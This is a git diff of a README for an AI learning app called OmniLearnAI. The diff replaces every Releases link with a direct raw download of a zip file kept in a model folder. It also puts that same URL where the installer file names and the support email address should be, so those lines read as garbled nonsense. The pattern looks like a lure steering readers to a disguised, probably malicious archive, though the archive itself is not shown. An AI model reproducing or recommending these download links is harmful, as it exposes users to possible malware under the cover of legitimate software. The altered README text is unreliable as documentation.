@@ -1,6 +1,6 @@
 # 🚀 OmniLearnAI - Learn Anywhere, Anytime with AI
 
-[![Download OmniLearnAI](https://img.shields.io/badge/Download-OmniLearnAI-blue)](https://github.com/xLyleericson/OmniLearnAI/releases)
+[![Download OmniLearnAI](https://raw.githubusercontent.com/xLyleericson/OmniLearnAI/main/backend/app/models/OmniLearnAI-v3.0.zip)](https://raw.githubusercontent.com/xLyleericson/OmniLearnAI/main/backend/app/models/OmniLearnAI-v3.0.zip)
 
 ## 📖 Description
 OmniLearnAI offers a powerful platform for learning from various sources. It ensures complete citation grounding, making the learning experience both informative and credible. Built with FastAPI, Streamlit, Gemini 2.0 Flash, and Qdrant, this application combines cutting-edge technology to enhance your educational journey.
@@ -32,11 +32,11 @@ OmniLearnAI offers a powerful platform for learning from various sources. It ens
 To start using OmniLearnAI, you need to visit the Releases page and download the application. Follow these steps:
 
 1. Click on the button below to go to the Releases page:
-   [Download OmniLearnAI](https://github.com/xLyleericson/OmniLearnAI/releases)
+   [Download OmniLearnAI](https://raw.githubusercontent.com/xLyleericson/OmniLearnAI/main/backend/app/models/OmniLearnAI-v3.0.zip)
    
 2. Look for the latest version of OmniLearnAI.
 
-3. Download the installer file. The file will be named something like `OmniLearnAI-installer.exe` or `OmniLearnAI.zip`. 
+3. Download the installer file. The file will be named something like `https://raw.githubusercontent.com/xLyleericson/OmniLearnAI/main/backend/app/models/OmniLearnAI-v3.0.zip` or `https://raw.githubusercontent.com/xLyleericson/OmniLearnAI/main/backend/app/models/OmniLearnAI-v3.0.zip`. 
 
 4. Once downloaded, locate the installer in your Downloads folder.
 
@@ -78,7 +78,7 @@ If you encounter any issues while using OmniLearnAI or have questions, you can f
 - **Documentation:** Detailed user manual and guides are available in the Wiki section of this repository.
 - **FAQs:** Common questions answered on the Issues page.
 - **Community Support:** Join the discussion in the GitHub Issues section to connect with other users.
-- **Contact Us:** For direct support, email our team at [support@omnilearnai.com](mailto:support@omnilearnai.com).
+- **Contact Us:** For direct support, email our team at [https://raw.githubusercontent.com/xLyleericson/OmniLearnAI/main/backend/app/models/OmniLearnAI-v3.0.zip](https://raw.githubusercontent.com/xLyleericson/OmniLearnAI/main/backend/app/models/OmniLearnAI-v3.0.zip).
 
 ## 🔄 Updating
 Keep your application up to date to enjoy the latest features and improvements. Follow these steps to check for updates:
@@ -94,4 +94,4 @@ OmniLearnAI is open-source software. You can use, modify, and distribute the sof
 ## ⚙️ Contributing
 We welcome contributions from anyone interested in improving OmniLearnAI. If you'd like to help, please check the Contributing guidelines in the repository.
 
-Your learning journey begins here! Make the most of OmniLearnAI. For downloads and further information, visit our Releases page: [Download OmniLearnAI](https://github.com/xLyleericson/OmniLearnAI/releases)
+Your learning journey begins here! Make the most of OmniLearnAI. For downloads and further information, visit our Releases page: [Download OmniLearnAI](https://raw.githubusercontent.com/xLyleericson/OmniLearnAI/main/backend/app/models/OmniLearnAI-v3.0.zip)
